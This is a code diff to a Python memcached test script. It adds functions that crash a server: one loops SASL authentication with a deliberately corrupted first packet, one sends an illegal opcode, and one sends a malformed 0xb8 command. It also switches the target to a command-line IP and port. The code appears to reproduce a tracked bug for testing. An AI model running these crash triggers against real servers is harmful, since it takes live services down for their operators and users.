@@ -1,6 +1,7 @@
 
 import pprint
 import time
+import sys
 
 from lib.dcp_bin_client import DcpClient
 from lib.mc_bin_client import MemcachedClient as McdClient
@@ -9,7 +10,7 @@ from constants import *
 def get_dcp_stuff(host, port):
     mcd_client = McdClient(host, port)
     dcp = mcd_client.stats('dcp')
-
+    print dcp
     # Find a VB consumer and seqno
     for key in dcp:
         keyList = key.split("_")
@@ -85,7 +86,28 @@ def kill_node_attack_1(host, port):
     print "Sending stream close"
     op = upr_client.close_stream(vbid)
 
+def kill_node_MB_16207(host, port):
+    # Force the first packet we send to be illegal
+    mcd_client = McdClient(host, port, illegal=1)
+    while 1:
+        try:
+            # Keep authing until the server goes away.
+            # Note that the mcd_client lib in this example is hacked to mess up the first packet.
+            mcd_client.sasl_auth_cram_md5("_admin", "password")
+        except:
+            print "Caught an exception, memcached dead now?"
+            break
+
+def kill_node_illegal_opcode(host, port):
+    mcd_client = McdClient(host, port)
+    mcd_client._sendCmd(255, "", "", 99)
+
+def kill_node_get_all_keys(host, port):
+    mcd_client = McdClient(host, port)
+    mcd_client._sendCmd(0xb8, "", "", 99, extraHeader='abcde', cas=0)
+
 if __name__ == "__main__":
-    ip = '127.0.0.1'
-    port = 12000
-    kill_node_attack_2(ip, port)
+
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    kill_node_get_all_keys(ip, port)
